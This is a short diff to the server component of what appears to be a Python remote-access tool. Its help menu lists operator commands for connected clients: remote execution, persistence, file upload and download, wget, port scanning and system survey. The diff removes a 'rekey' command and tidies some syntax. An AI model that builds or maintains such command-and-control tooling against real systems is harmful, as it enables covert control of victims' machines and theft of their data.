@@ -39,15 +39,14 @@ help                - Show this help menu.
 kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
 quit                - Exit the server and end all client connections.
-rekey               - Regenerate crypto key.
 scan <ip>           - Scan top 25 ports on a single host.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
 COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'rekey', 'scan', 'survey', 'unzip',
-             'upload', 'wget' ]
+             'persistence', 'quit', 'scan', 'survey', 'unzip', 'upload',
+             'wget' ]
 
 
 class Server(threading.Thread):
@@ -96,7 +95,7 @@ class ClientConnection(common.Client):
         self.sendGCM(prompt)
         self.conn.settimeout(1)
 
-        cmd, _, action = prompt.partition(" ")
+        cmd, _, action = prompt.partition(' ')
 
         # kill client connection
         if cmd == 'kill':
@@ -208,10 +207,9 @@ def main():
             continue
 
         # require client id
-        if client == None:
+        if not client:
             print 'Error: Invalid client ID.'
             continue
-
 
         # send data to client
         try:
